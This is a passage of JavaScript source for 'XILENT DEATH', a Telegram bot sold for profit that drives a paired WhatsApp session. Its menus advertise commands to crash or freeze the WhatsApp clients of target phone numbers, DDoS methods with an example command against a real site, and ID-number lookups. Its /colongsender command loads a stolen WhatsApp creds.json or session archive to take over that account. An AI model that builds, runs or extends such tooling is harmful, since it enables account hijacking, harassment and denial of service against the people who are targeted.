    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote> ⬡═―—⊱ ⎧ XILENT DEATH ⎭ ⊰―—═⬡
𖤓 Number: ${lastPairingMessage.phoneNumber}
𖤓 Pairing Code: ${lastPairingMessage.pairingCode}
𖤓 Status: Connected
</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.blue(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⢄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀
`));
console.log(chalk.bold.red(`
╭─❖──────────────────────────❖─╮
│ Developer : @GaponReal
│ Version : 1.0.0
│ Status : Sender connected 
├───────────────────────────────
│⟢ XILENT DEATH Starting...
╰─❖──────────────────────────❖─╯
  `));
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

let adminUsers = new Set([ownerID.toString()]);
function isAdminUser(userId) {
    return adminUsers.has(userId.toString());
}

function checkAdmin(ctx, next) {
    if (!isAdminUser(ctx.from.id)) {
        return ctx.reply("❌ ☇ Akses hanya untuk admin");
    }
    next();
}

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } else if (args.length >= 2) {
        userId = args[1];
    } else {
        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /addadmin\n2. /addadmin <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID tidak valid");
    }
    
    adminUsers.add(userId);
    
    await ctx.reply(
        `👑 <b>Admin Berhasil Ditambahkan</b>\n• User: <code>${userId}</code>`,
        { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id }
    );
    
    try {
        await ctx.telegram.sendMessage(
            userId,
            `🎖️ <b>Anda sekarang Admin XILENT DEATH!</b>\nAkses: Semua command bot kecuali manage admin`,
            { parse_mode: "HTML" }
        );
    } catch (error) {}
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } else if (args.length >= 2) {
        userId = args[1];
    } else {
        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /deladmin\n2. /deladmin <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID tidak valid");
    }
    
    if (userId === ownerID.toString()) {
        return ctx.reply("❌ ☇ Tidak bisa hapus owner");
    }
    
    const wasAdmin = adminUsers.delete(userId);
    
    if (wasAdmin) {
        await ctx.reply(`🗑️ <b>Admin Berhasil Dihapus</b>\n• User: <code>${userId}</code>`,
            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
    } else {
        await ctx.reply(`❌ <b>User bukan admin</b>\n• User: <code>${userId}</code>`,
            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
    }
});

bot.command('listadmin', checkAdmin, async (ctx) => {
    let adminList = "👥 <b>Daftar Admin</b>\n\n";
    let counter = 1;
    
    adminUsers.forEach(userId => {
        adminList += `${counter}. <code>${userId}</code> ${userId === ownerID.toString() ? '👑' : '👨‍💼'}\n`;
        counter++;
    });
    
    adminList += `\nTotal: ${adminUsers.size} admin`;
    await ctx.reply(adminList, { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
});

function getPremiumUsers() {
    const premiumPath = path.join(__dirname, 'database', 'premium.json');
    
    try {
        if (fs.existsSync(premiumPath)) {
            const data = JSON.parse(fs.readFileSync(premiumPath, 'utf8'));
            
            if (typeof data === 'object' && !Array.isArray(data)) {
                return Object.entries(data).map(([userId, expiryDate]) => ({
                    userId,
                    expiryDate
                }));
            }
            
            else if (Array.isArray(data)) {
                return data;
            }
        } else {
            console.log("File premium.json tidak ditemukan di", premiumPath);
        }
    } catch (error) {
        console.error("Error membaca premium.json:", error);
    }
    return [];
}

bot.command('listprem', checkAdmin, async (ctx) => {
    const premiumUsers = getPremiumUsers();
    
    if (!premiumUsers || premiumUsers.length === 0) {
        return ctx.reply("📭 Tidak ada user premium");
    }
    
    let premList = "🌟 <b>Daftar User Premium</b>\n\n";
    
    premiumUsers.forEach((user, index) => {
        const userId = user.userId || user.id || "N/A";
        const expiry = user.expiryDate || user.expiry || "Unknown";
        
        // Cek apakah expired
        let status = "✅ Active";
        try {
            const expiryDate = new Date(expiry);
            if (new Date() > expiryDate) {
                status = "❌ Expired";
            }
        } catch (e) {}
        
        premList += `${index + 1}. <code>${userId}</code>\n`;
        premList += `   • Berakhir: ${expiry}\n`;
        premList += `   • Status: ${status}\n\n`;
    });
    
    premList += `Total: ${premiumUsers.length} user premium`;
    
    await ctx.reply(premList, { 
        parse_mode: "HTML",
        reply_to_message_id: ctx.message.message_id 
    });
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } 
    
    else if (args.length >= 2) {
        userId = args[1];
    } 

    else {
        return ctx.reply("🪧 ☇ Cara penggunaan:\n1. Reply pesan target dan ketik /addprem\n2. /addprem <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID user tidak valid");
    }
    
    const keyboard = {
        inline_keyboard: [
            [
                { text: "⌜📅⌟ 1 Bulan (30 Hari)", callback_data: `addprem_${userId}_30` }
            ],
            [
                { text: "⌜⚡⌟ Permanen (100 Hari)", callback_data: `addprem_${userId}_100` }
            ]
        ]
    };
    
    await ctx.reply(
        `👑 <b>Tambah Premium</b>\n` +
        `• User: <code>${userId}</code>\n` +
        `• Pilih durasi di bawah:`,
        {
            parse_mode: "HTML",
            reply_to_message_id: ctx.message.message_id,
            reply_markup: keyboard
        }
    );
});

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "GAPOOFFC");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><b> ⬡═―—⊱ ⎧ XILENT DEATH ⎭ ⊰―—═⬡
𖤓 Number: ${phoneNumber}
𖤓 Pairing Code: ${formattedCode}
𖤓 Status: Not Connected
</b></blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><b> ⬡═―—⊱ ⎧ XILENT DEATH ⎭ ⊰―—═⬡ 
𖤓 Number: ${lastPairingMessage.phoneNumber}
𖤓 Pairing Code: ${lastPairingMessage.pairingCode}
𖤓 Status: Connected
</b></blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("delsender", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('colongsender', async (ctx) => {
  const msg = ctx.message;
  const chatId = msg.chat.id;
  
  if (!isOwner(msg)) return ctx.reply('❌ Khusus owner we.');

  const doc = msg.reply_to_message?.document;
  if (!doc) return ctx.reply('❌ Balas file session atau creds.json + dengan /colongsender');

  const name = doc.file_name.toLowerCase();
  if (!['.json','.zip','.tar','.tar.gz','.tgz'].some(ext => name.endsWith(ext)))
    return ctx.reply('❌ File bukan session tolol.');

  await ctx.reply('🔄 Proses colong sender in you session…');

  const url = await bot.getFileLink(doc.file_id);
  const { data } = await axios.get(url, { responseType: 'arraybuffer' });
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'));

  if (name.endsWith('.json')) {
    await fs.writeFile(path.join(tmp, 'creds.json'), data);
  } else if (name.endsWith('.zip')) {
    new AdmZip(data).extractAllTo(tmp, true);
  } else {
    const tmpTar = path.join(tmp, name);
    await fs.writeFile(tmpTar, data);
    await tar.x({ file: tmpTar, cwd: tmp });
  }

  const credsPath = await findCredsFile(tmp);
  if (!credsPath) return ctx.reply('❌ creds.json tidak ditemukan bego');

  const creds = await fs.readJson(credsPath);
  const botNumber = creds.me.id.split(':')[0];

  await fs.remove(destDir);
  await fs.copy(tmp, destDir);
  saveActiveSessions(botNumber);

  const auth = await useMultiFileAuthState(destDir);
  await connectToWhatsApp(botNumber, chatId, auth);

  return ctx.reply(`*SUCCES CONNECTING🫀*
  NUMBER : ${botNumber}
  *ANJAYYY KEMALING🗿*`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgroup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcprem -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgroup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcprem -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.use((ctx, next) => {
    if (secureMode) return;

    const text = (ctx.message && ctx.message.text) ? ctx.message.text : "";
    const data = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data : "";
    const isStart = (typeof text === "string" && text.startsWith("/start")) ||
                    (typeof data === "string" && data === "/start");

    if (!tokenValidated && !isStart) {
        if (ctx.callbackQuery) {
            try { ctx.answerCbQuery("🔑 ☇ Masukkan token anda untuk diaktifkan, Format: /start "); } catch (e) {}
        }
        return ctx.reply("🔒 ☇ Akses terkunci ketik /start  untuk mengaktifkan bot");
    }
    return next();
});

bot.start(async (ctx) => {
  if (!tokenValidated) {

    const msg = await ctx.reply("🔐 Verifikasi Token Server...\n▱▱▱▱▱▱▱▱▱▱ 0%");

    function createBar(percent) {
  const total = 10;
  const filled = Math.floor(percent / 10);
  const empty = total - filled;
  return "▰".repeat(filled) + "▱".repeat(empty);
}

const progressList = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100];

for (let p of progressList) {
  await new Promise(r => setTimeout(r, 250));

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    msg.message_id,
    null,
    `🔐 Verifikasi Token Server...\n${createBar(p)} ${p}%`
  );
}

    try {
      const res = await axios.get(databaseUrl);
      const tokens = (res.data && res.data.tokens) || [];

      
      if (!tokens.includes(tokenBot)) {
        return ctx.telegram.editMessageText(
          ctx.chat.id,
          msg.message_id,
          null,
          `
<blockquote><b><tg-emoji emoji-id="4958526153955476488">❌</tg-emoji> TOKEN INVALID</b></blockquote>
<pre>
━━━━━━━━━━━━━━━━━━
Akses Ditolak

Bot tidak terdaftar
di database server

Silakan hubungi developer

━━━━━━━━━━━━━━━━━━
@GaponReal
</pre>
`,
          { parse_mode: "HTML" }
        );
      }

      // ✅ TOKEN VALID
      tokenValidated = true;

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        msg.message_id,
        null,
        "✅ Verifikasi berhasil"
      );

    
     await ctx.reply(`\`\`\`js
TOKEN VALID
━━━━━━━━━━━━━━━━━━
Assalamualaikum 
Xilent Death

• Script Berkualitas
• Sistem Powerful & Stabil
• Fitur Lengkap & Premium

• Price Script : 5.000
• Reseller : 15.000

━━━━━━━━━━━━━━━━━━
@GaponReal\`\`\``,
      { parse_mode: "Markdown" });

    } catch (e) {
      return ctx.telegram.editMessageText(
        ctx.chat.id,
        msg.message_id,
        null,
        "❌ ☇ Gagal memverifikasi ke database"
      );
    }
 }

  try {
    await ctx.telegram.setMessageReaction(
      ctx.chat.id,
      ctx.message.message_id,
      [
        {
          type: "emoji",
          emoji: "👾"
        }
      ],
      true
    );

    console.log("Bot Jalan");
  } catch (error) {
    console.error("Gagal react:", error);
  }

  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
  const senderStatus = isWhatsAppConnected ? "Terisi" : "Kosong";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();
  const username = ctx.from?.username ? `@${ctx.from.username}` : "Tidak ada username";

  const menuMessage = `
<blockquote><b>「 𝕏 𝕀 𝕃 𝔼 ℕ 𝕋  𝔻 𝔼 𝔸 𝕋 ℍ  」</b></blockquote>
<blockquote>════════════════
<b>ＩＮＦＯＲＭＡＴＩＯＮ</b>
════════════════
Owner : @GaponReal
System : Auto Update 
Runtime : ${runtimeStatus}
Status Sender : ${senderStatus}
Acces : ${premiumStatus}
════════════════
Hello @${ctx.from.username}🕷, Selamat Datang
Di Xilent Death, Mohon Gunakan Dengan Baik.</blockquote>
<blockquote><b>🍂 | Click The Button</b></blockquote>`;

  const keyboard = [
    [
      { text: "≡ Tools Menu「🛠️」", callback_data: "/controls", style: "Danger"},
      { text: "≡ Bug Menu「🐞」", callback_data: "/buges", style: "Success"}
    ],
    [ 
      { text: "≡ Thanks To「💖」", callback_data: "/tqto", style: "Primary" }
    ],
    [
      { text: "「🕷」Creator Script", url: "t.me/GaponReal", style: "success"},
      { text: "⌜📰⌟ Information Script", url: "t.me/xilentdeathinfo", style: "primary"}
    ]
  ];

  const mp3Url = "https://files.catbox.moe/uuewio.mp3";

  try {
    await ctx.replyWithPhoto(StartUrl, {
      caption: menuMessage,
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.replyWithAudio({ url: mp3Url }, {
      title: "Xilent Death 1.0",
      performer: "Xilent Death 1.0"
    });
  } catch (err) {
    console.error("Error sending menu:", err);
  }
});

bot.action('/start', async (ctx) => {
    if (!tokenValidated) {
        try { 
            await ctx.answerCbQuery(); 
        } catch (e) {}
        return ctx.reply("🔑 ☇ Masukkan token anda untuk diaktifkan, Format: /start ");
    }

    try {
        // -------------------------------
        const senderStatus = isWhatsAppConnected ? "Yes" : "No";
        const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
        const runtimeStatus = formatRuntime();
        const memoryStatus = formatMemory();
        const cooldownStatus = loadCooldown();
        const username = ctx.from?.username ? `@${ctx.from.username}` : "Tidak ada username";

        const menuMessage = `
<blockquote expandable><b>━═「 ＸＩＬＥＮＴ ＤＥＡＴＨ 」═━</b>
<b>🜲 Script Xilent Death 🜲</b>
──────────────────
Full Update : 5K
Reseller : 15K
Partner : 20K
Moderator : 25K
Ceo Permanen : 35K
Owner Permanen : 45K
──────────────────
Efek Silahkan Try Sendiri
Contact : @GaponReal</blockquote>
<blockquote><b>Sender Status: ${senderStatus}</b></blockquote>`;

        const keyboard = [
    [
      { text: "≡ Tools Menu「🛠️」", callback_data: "/controls", style: "Danger"},
      { text: "≡ Bug Menu「🐞」", callback_data: "/buges", style: "Success"}
    ],
    [ 
      { text: "≡ Thanks To「💖」", callback_data: "/tqto", style: "Primary" }
    ],
    [
      { text: "「🕷」Creator Script", url: "t.me/GaponReal", style: "success"},
      { text: "⌜📰⌟ Information Script", url: "t.me/xilentdeathinfo", style: "primary"}
    ]
  ];

    await ctx.editMessageMedia(
      {
        type: "video",
        media: StartUrl,
        caption: menuMessage,
        parse_mode: "HTML"
      },
      {
        reply_markup: { inline_keyboard: keyboard }
      }
    );
  } catch (err) {
    console.error(err);
    await ctx.reply("❌ Anjay Error.");
  }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `
<blockquote expandable><b>━═「 ＸＩＬＥＮＴ ＤＥＡＴＨ 」═━
❀ ! /addprem id ☇ days
   ╰┈➤ Add Premium User
❀ ! /delprem ☇ id
   ╰┈➤ Delete Premium User
❀ ! /addadmin id ☇ Days
   ╰┈➤ Add Admin User
❀ ! /deladmin ☇ id 
   ╰┈➤ Delete Admin User
❀ ! /addbot
   ╰┈➤ Add Sender Bug
╰─────────────────────⬣
━═「 ＸＩＬＥＮＴ ＵＰＤＡＴＥ 」═━
❀ ! /update ☇ in place
   ╰┈➤ Update Script Otomatis
╰─────────────────────⬣</b></blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back To Menu",
                callback_data: "/start",
                style: "Danger"
            },
            {
                text: "⌜🔜⌟ Owner 2", callback_data: "/ownah", style: "Success"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: toolsUrl,
                caption: controlsMenu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/ownah', async (ctx) => {
    const bug3Menu = `
<blockquote><b>「 ＯＷＮＥＲ ＭＥＮＵ 」</b></blockquote>
<blockquote expandable><b>━═「 ＸＩＬＥＮＴ ＶＩＰ 」═━</b>
❀ ! /listprem
   ╰┈➤ List Premium User 
❀ ! /listadmin
   ╰┈➤ List Admin User    
❀ ! /addgroup ☇ days
   ╰┈➤ Add Group Premium
❀ ! /delgroup ☇ In Place
   ╰┈➤ Delete Premium Group
❀ ! /setcd ☇ waktu
   ╰┈➤ Set Cooldown Bug
❀ ! /delsender ☇ -
   ╰┈➤ Reset Session
╰─────────────────────⬣</blockquote>
<blockquote><b># - Xilent Death Attack</b></blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back To Owner",
                callback_data: "/controls",
                style: "Danger"
            },
            {
                text: "⌜🔜⌟ Tools Xilent", callback_data: "/toolus", style: "Success"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: bugUrl,
                caption: bug3Menu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/buges', async (ctx) => {
    const toolssMenu = `
<blockquote><b>「 ＢＵＧ ＭＥＮＵ 」</b></blockquote>
<blockquote expandable><b>━═「 ＸＩＬＥＮＴ ＤＥＡＴＨ 」═━</b>
❀ ! /flowx 62xx
   ╰┈➤ Ios Delay
❀ ! /xios 62xx
   ╰┈➤ Dark Ios
╰─────────────────────⬣   
<b>━═「 ＸＩＬＥＮＴ ＦＵＮ 」═━</b>
❀ ! /fixedbug 62xx
   ╰┈➤ Hapus Semua Bug
❀ ! /tesfunction 62xx
   ╰┈➤ Tes Func Ampas U
╰─────────────────────⬣</blockquote>
<blockquote><b># - Xilent Death Attack</b></blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back To Menu",
                callback_data: "/start",
                style: "Danger"
            },
            {
                text: "⌜🔜⌟ Bug Menu 2", callback_data: "/bug", style: "Success"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: toolsUrl,
                caption: toolssMenu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/toolus', async (ctx) => {
    const toolsssMenu = `
<blockquote><b>〘 Zoro DDoS 〙</b></blockquote>
<blockquote><b>𖤓 pidoras
𖤓 h2
𖤓 h2vip
𖤓 mix
𖤓 strike
𖤓 flood 
〣 /mediafire - convert MediaFire 
〣 /trackip - IP Information
〣 /tiktok - Tiktok Downloader
〣 /igdl - Instagram Downloader
〣 /nikparse - Nik Infomation
〣 /colongsender - Colong Sender Creds
〣 /csessions - Colong Session#1
〣 /getsender - Colong Session#2
〣 /convert - To Url Media
〣 /brat - Quotes Sticker
〣 /yt - YouTube Search
〣 /gethtml - Get Code HTML
〣 /cekefek - Checking Effect Function
╘═—————————————–——═⬡</b></blockquote>
<blockquote><b>Example:
/ddos https://xnxx.com 5000 pidoras</b></blockquote>
`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back To Menu",
                callback_data: "/start",
                style: "Danger"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: toolsUrl,
                caption: toolsssMenu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `<blockquote><b>「 ＢＵＧ ＭＥＮＵ 」</b></blockquote>
<blockquote expandable><b>━═「 ＸＩＬＥＮＴ ＡＮＤＲＯＩＤ 」═━</b>
❀ ! /xforce 62xx
   ╰┈➤ Forclose Andro
❀ ! /xdelay 62xx
   ╰┈➤ Delay Andro
❀ ! /xfuck 62xx
   ╰┈➤ Blank No Click
╰─────────────────────⬣</blockquote>
<blockquote><b># - Xilent Death Attack</b></blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back To Menu",
                callback_data: "/start",
                style: "Danger"
            },
            {
                text: "⌜🔜⌟ Next Menu Bug", callback_data: "/bug2", style: "Success"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: menuUrl,
                caption: bugMenu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/bug2', async (ctx) => {
    const bug3Menu = `
<blockquote><b>「 ＢＵＧ ＭＥＮＵ 」</b></blockquote>
<blockquote expandable><b>━═「 ＸＩＬＥＮＴ ＡＮＤＲＯＩＤ 」═━</b>
❀ ! /zero 62xx
   ╰┈➤ Coming Soon
❀ ! /zero 62xx
   ╰┈➤ Coming Soon
❀ ! /zero 62xx
   ╰┈➤ Coming Soon
╰─────────────────────⬣</blockquote>
<blockquote><b># - Xilent Death Attack</b></blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back To Menu",
                callback_data: "/start",
                style: "Danger"
            },
            {
